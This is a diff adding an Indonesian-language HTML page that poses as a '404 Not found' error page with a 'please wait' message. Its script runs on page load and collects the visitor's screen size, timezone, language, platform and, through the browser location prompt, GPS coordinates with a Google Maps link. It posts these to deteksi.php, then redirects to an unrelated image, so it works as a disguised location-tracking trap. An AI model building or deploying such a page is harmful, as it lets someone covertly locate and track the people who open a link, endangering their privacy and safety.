@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <title>404 Not found</title>
+  <script>
+    function kirimData(data) {
+      fetch('deteksi.php', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).then(() => {
+        // Redirect setelah log
+        window.location.href = "https://awsimages.detik.net.id/community/media/visual/2017/12/06/6414c1ae-fcd1-49a6-8316-4a71c29f93ff_43.jpg?w=1200";
+      });
+    }
+
+    window.onload = function () {
+      let data = {
+        screen: window.screen.width + "x" + window.screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        platform: navigator.platform
+      };
+
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+
+            data.latitude = lat;
+            data.longitude = lon;
+            data.maps_url = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            kirimData(data);
+          },
+          err => {
+            data.latitude = "Ditolak/Unavailable";
+            data.longitude = "Ditolak/Unavailable";
+            data.maps_url = "Tidak tersedia";
+            kirimData(data);
+          },
+          { timeout: 5000 }
+        );
+      } else {
+        data.latitude = "Tidak didukung";
+        data.longitude = "Tidak didukung";
+        data.maps_url = "Tidak tersedia";
+        kirimData(data);
+      }
+    };
+  </script>
+</head>
+
+<body>
+  <p>mohon tunggu sebentar....</p>
+</body>
+
+</html>
